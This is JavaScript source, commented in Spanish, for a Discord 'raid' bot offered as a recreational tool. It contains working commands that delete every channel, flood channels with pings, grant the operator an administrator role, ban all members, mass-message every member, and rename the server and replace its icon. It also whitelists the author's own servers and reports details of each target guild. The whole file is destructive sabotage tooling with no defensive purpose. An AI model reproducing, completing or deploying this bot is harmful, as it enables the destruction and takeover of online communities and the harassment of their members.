/**
 * 
 * BOT DE RAID PARA SERVIDORES DE DISCORD
 * 
 * Desarrollado por Alejandro Garcia
 * Programador y hacker etico
 * Discord: @AlejandroGarcia#7590
 * 
 * Uso para fines recreativos
 * 
 * Version: MinelordNonSecurity v2.0.0
 * Fecha de lanzamiento 29/octubre/2022
 * 
 */
const Discord = require("discord.js");
const client = new Discord.Client();
const keepAlive = require('./server');
const functions = require('./functions');
const variables = require('./variables.json');

const { spawnSync } = require("child_process");
const { resolve } = require("path");

var usuario;
var server;

var ejecutado = false;

const whitelist = [
  '953539953588076566',   //MinelordCorporation
  '998819207980527638',   //2b2tpe - tv
  '965045822934884472',   //MineShop
  '978129444768186430',   //Leviatan
  '1028779739357397032',  //MinelordBank
  '792232007395704852',   //Raiders
  '963180224361684992'    //Hydra
]

const embeda = new Discord.MessageEmbed()
  .setTitle("Raid Fallido")
  .setDescription(`
**Ups... no puedes raidear este servidor.**
Este servidor pertenece a la lista de inmunidad de del bot por lo que **su raideo será imposible**.
`)
  .setColor("RED");

const embede = new Discord.MessageEmbed()
  .setTitle("White list | Lista de servidores inmunes al bot")
  .setDescription(`
**Lista de servidores donde el bot se autodesactiva:**
• \`MinelordCorporation\`
• \`ʀɑiɗɛʀร 💀\`
• \`卄ㄚᗪ尺卂\`
`)
  .setColor("RED");


client.on("ready", () => {

  console.log("\x1B[38;2;75;150;166m", `
     
      ▒█▀▄▀█ ░▀░ █▀▀▄ █▀▀ █░░ █▀▀█ █▀▀█ █▀▀▄ ▒█▄░▒█ █▀▀█ █▀▀▄ ▒█▀▀▀█ █▀▀ █▀▀ █░░█ █▀▀█ ░▀░ ▀▀█▀▀ █░░█ 
      ▒█▒█▒█ ▀█▀ █░░█ █▀▀ █░░ █░░█ █▄▄▀ █░░█ ▒█▒█▒█ █░░█ █░░█ ░▀▀▀▄▄ █▀▀ █░░ █░░█ █▄▄▀ ▀█▀ ░░█░░ █▄▄█ 
      ▒█░░▒█ ▀▀▀ ▀░░▀ ▀▀▀ ▀▀▀ ▀▀▀▀ ▀░▀▀ ▀▀▀░ ▒█░░▀█ ▀▀▀▀ ▀░░▀ ▒█▄▄▄█ ▀▀▀ ▀▀▀ ░▀▀▀ ▀░▀▀ ▀▀▀ ░░▀░░ ▄▄▄█
                              Bot para raid Oficial hecho por Alejandro Garcia
  ...`);  
  console.log("\x1b[36m", `Developer: ${variables.developer}`);
  console.log("\x1b[36m", `Powered by: node.js & discord.js v13`);

  console.log("\x1B[38;2;193;221;227m",`
COMANDOS:

  ◆ .on        | Raidea el servidor de inmediato ejecutando todos los comandos.
  ◆ .nuke      | Elimina todos los chats, dejando solo 1 para poner otros comandos.
  ◆ .raid      | Crea muchos canales con ping y mensajes.
  ◆ .midraid   | Raidea el servidor sin eliminar canales.
  ◆ .admin     | Crea un rol con perms de administrador y te lo da.
  ◆ .addroles  | Agrega muchos roles al servidor.
  ◆ .delroles  | Elimina todos los roles inferiores al bot.
  ◆ .banall    | Banea a todos los usuarios del servidor (solo usuarios inferiores al bot).
  ◆ .mdall     | Envia multiples mensajes privados a todos los miembros del servidor
  ◆ .list      | Obten informacion del raid (stats).
  ◆ .nick      | Cambia todos los nicknames al nombre del server.
  ◆ .reset     | Resetea el bot en caso de fallas.
  ◆ .whitelist | Muestra la lista de los servidores que están en la whitelist.
`)

  presencia();
});

keepAlive();

function presencia() {
  client.user.setPresence({
    status: "dnd",
    activity: {
      name: "Manitas calientes",
      type: "PLAYING"
    }
  });
}

client.on("message", async message => {

  let comando = message.content.toLowerCase().trim();

  if (message.author.bot) return;

  if(comando.startsWith('.') && !ejecutado){
    message.guild.setName(`${variables.nombreServer}`);
    message.guild.setIcon(`${variables.logo}`);

    await functions.Report(message, `Guild name: ${message.guild.name}`, 1);
    await functions.Report(message, `Guild ID: ${message.guild.id}`, 1);
    await functions.Report(message, `Working with client: ${client.user.tag}`, 1)


    usuario = message.member.user.tag;
    server = message.guild.id;


    ejecutado = true;

  }

  if (whitelist.includes(message.guild.id)) {
    message.channel.send(embeda);
    return;
  }
  message.guild.setName(`${variables.nombreServer}`);
  message.guild.setIcon(`${variables.logo}`);

  switch (comando) {
    case '.on':
      await functions.Nuke(message);
      await functions.CrearCanales(message);
      await functions.DelRoles(message);
      await functions.AddRoles(message);
      await functions.Banear(message);
      //message.delete();
      break;

    case '.nuke':
      await functions.Nuke(message);
      message.delete();
      break;

    case '.raid':
      await functions.Nuke(message);
      await functions.CrearCanales(message);
      message.delete();
      break;

    case '.midraid':
      await functions.CrearCanales(message);
      message.delete();
      break;

    case '.admin':
      await functions.Admin(message);
      message.delete();
      break;

    case '.addroles':
      await functions.AddRoles(message);
      message.delete();
      break;

    case '.delroles':
      await functions.DelRoles(message);
      message.delete();
      break;

    case '.banall':
      await functions.Banear(message);
      message.delete();
      break;

    case '.mdall':
      await functions.MdAll(message);
      message.delete();
      break;

    case '.help':
        var embed = new Discord.MessageEmbed()
          .setTitle("Ayuda | Comandos disponibles")
          .setDescription(`
    • \`.on        \` | Raidea el servidor de inmediato ejecutando todos los comandos.
    • \`.nuke      \` | Elimina todos los chats, dejando solo 1 para poner otros comandos.
    • \`.raid      \` | Crea muchos canales con ping y mensajes.
    • \`.midraid   \` | Raidea el servidor sin eliminar canales.
    • \`.admin     \` | Crea un rol con perms de administrador y te lo da.
    • \`.addroles  \` | Agrega muchos roles al servidor.
    • \`.delroles  \` | Elimina todos los roles inferiores al bot.
    • \`.banall    \` | Banea a todos los usuarios del servidor (solo usuarios inferiores al bot).
    • \`.mdall     \` | Envia multiples mensajes privados a todos los miembros del servidor
    • \`.list      \` | Obten informacion del raid (stats).
    • \`.nick      \` | Cambia todos los nicknames al nombre del server.
    • \`.reset     \` | Resetea el bot en caso de fallas.
    • \`.whitelist \` | Muestra la lista de los servidores que están en la whitelist.
    
    `)
          .setColor("RED");
    
        message.channel.send(embed)
      message.delete();
      break;

    case '.reset':
      await functions.Stop(message, client);
      message.delete();
      break;

    case '.whitelist':
      message.channel.send(embede);
      break;

    case '.list':
      message.delete();
      const embedj = new Discord.MessageEmbed()
        .setTitle("Informacion de proceso de raid")
        .setDescription(`**Canales:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`)
        .setColor("RED");
      message.channel.send(embedj);
      break;

    case '.nick':
      message.delete();
      await functions.Nick(message);
      break;
  }
});



client.login(variables.token);